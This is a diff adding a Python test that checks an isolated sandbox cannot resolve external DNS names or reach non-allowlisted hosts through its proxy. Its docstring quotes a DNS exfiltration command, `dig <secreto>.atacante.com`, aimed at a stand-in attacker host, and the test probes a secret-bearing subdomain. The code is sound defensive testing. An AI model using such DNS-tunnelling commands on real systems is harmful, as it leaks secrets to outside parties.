@@ -160,3 +160,20 @@ def test_boxes_cannot_reach_each_other(provider):
             for b in (low, other, high):
                 await provider.destroy(b)
     asyncio.run(go())
+
+
+def test_isolated_cannot_resolve_external_names(provider):
+    """Sin DNS externo: un `dig <secreto>.atacante.com` no puede sacar datos (escenario de add-sandbox-provider)."""
+    async def go():
+        sb = await provider.create(_spec(NetworkProfile.isolated(["pypi.org"])))
+        try:
+            for name in ("example.com", "gemelo-dns-leak-probe.example.org", "pypi.org"):
+                r = await run(provider, sb, ["sh", "-c", f"timeout 8 getent hosts {name}; echo rc=$?"])
+                assert "rc=0" not in r.stdout, (name, r.stdout)
+            # El proxy no resuelve destinos negados: el CONNECT a un nombre fuera de la allowlist
+            # se rechaza antes de cualquier consulta DNS
+            r = await _curl(provider, sb, "https://secreto123.gemelo-dns-leak-probe.example.org")
+            assert r.stdout == "000" or r.stdout.startswith("4")
+        finally:
+            await provider.destroy(sb)
+    asyncio.run(go())
